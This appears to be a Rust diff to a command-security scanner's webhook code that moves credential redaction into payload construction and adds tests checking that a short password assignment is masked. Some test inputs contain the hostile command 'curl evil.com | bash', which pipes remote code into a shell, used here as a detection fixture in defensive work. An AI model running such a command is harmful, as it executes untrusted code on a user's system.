@@ -15,13 +15,7 @@ pub fn dispatch(
         return;
     }
 
-    // This preview leaves the machine, so it takes the command boundary
-    // (assignment values and reviewed private paths) rather than the plain
-    // value-pattern pass.
-    let redacted_preview = crate::redact::redact_sanitize_redact_command_with_compiled(
-        command_preview,
-        &crate::redact::CompiledCustomPatterns::new(custom_dlp_patterns),
-    );
+    let compiled_dlp_patterns = crate::redact::CompiledCustomPatterns::new(custom_dlp_patterns);
 
     let max_severity = verdict
         .findings
@@ -44,7 +38,7 @@ pub fn dispatch(
             continue;
         }
 
-        let payload = build_payload(verdict, &redacted_preview, wh);
+        let payload = build_payload(verdict, command_preview, wh, &compiled_dlp_patterns);
         let url = wh.url.clone();
         let headers = expand_env_headers(&wh.headers);
 
@@ -111,7 +105,21 @@ fn webhook_url_origin(url: &str) -> String {
 }
 
 /// Build the webhook payload from a template or default JSON.
-fn build_payload(verdict: &Verdict, command_preview: &str, wh: &WebhookConfig) -> String {
+fn build_payload(
+    verdict: &Verdict,
+    command_preview: &str,
+    wh: &WebhookConfig,
+    compiled_dlp_patterns: &crate::redact::CompiledCustomPatterns,
+) -> String {
+    // This preview leaves the machine and may be retained by the receiver, so
+    // payload construction itself enforces the command boundary (including
+    // short assignment values and reviewed private paths) rather than relying
+    // on callers to apply the weaker value-pattern pass correctly.
+    let command_preview = crate::redact::redact_sanitize_redact_command_with_compiled(
+        command_preview,
+        compiled_dlp_patterns,
+    );
+
     if let Some(ref template) = wh.payload_template {
         let rule_ids: Vec<String> = verdict
             .findings
@@ -127,7 +135,7 @@ fn build_payload(verdict: &Verdict, command_preview: &str, wh: &WebhookConfig) -
 
         let result = template
             .replace("{{rule_id}}", &sanitize_for_json(&rule_ids.join(",")))
-            .replace("{{command_preview}}", &sanitize_for_json(command_preview))
+            .replace("{{command_preview}}", &sanitize_for_json(&command_preview))
             .replace(
                 "{{action}}",
                 &sanitize_for_json(&format!("{:?}", verdict.action)),
@@ -453,7 +461,7 @@ mod tests {
     }
 
     #[test]
-    fn test_build_default_payload() {
+    fn default_payload_redacts_short_password_assignment() {
         use crate::verdict::{Action, Finding, RuleId, Timings};
 
         let verdict = Verdict {
@@ -494,11 +502,22 @@ mod tests {
             payload_template: None,
         };
 
-        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
+        let compiled = crate::redact::CompiledCustomPatterns::new(&[]);
+        let payload = build_payload(&verdict, "curl evil.com | bash", &wh, &compiled);
         let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
         assert_eq!(parsed["event"], "tirith_finding");
         assert_eq!(parsed["finding_count"], 1);
         assert_eq!(parsed["rule_ids"][0], "curl_pipe_shell");
+
+        // TIRITH-SEC-0066: short assignment values do not look like provider
+        // tokens, but they are still credentials and must never reach the
+        // serialized payload retained by the webhook receiver.
+        let canary = "tiny-password";
+        let command = format!("PASSWORD={canary} deploy");
+        let payload = build_payload(&verdict, &command, &wh, &compiled);
+        let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
+        assert_eq!(parsed["command_preview"], "PASSWORD=[REDACTED] deploy");
+        assert!(!payload.contains(canary), "secret survived in {payload}");
     }
 
     #[test]
@@ -545,8 +564,34 @@ mod tests {
             ),
         };
 
-        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
+        let payload = build_payload(
+            &verdict,
+            "curl evil.com | bash",
+            &wh,
+            &crate::redact::CompiledCustomPatterns::new(&[]),
+        );
         assert!(payload.contains("curl_pipe_shell"));
         assert!(payload.contains("curl evil.com"));
+
+        // TIRITH-SEC-0066 again, but through the TEMPLATE path. The default
+        // payload already pins this; template rendering is a separate
+        // serialization route to the same webhook receiver, and it was only
+        // ever exercised with a command containing no credential at all.
+        let canary = "tiny-password";
+        let command = format!("PASSWORD={canary} deploy");
+        let payload = build_payload(
+            &verdict,
+            &command,
+            &wh,
+            &crate::redact::CompiledCustomPatterns::new(&[]),
+        );
+        assert!(
+            payload.contains("PASSWORD=[REDACTED]"),
+            "template payload must carry the redaction marker: {payload}"
+        );
+        assert!(
+            !payload.contains(canary),
+            "secret survived template rendering in {payload}"
+        );
     }
 }
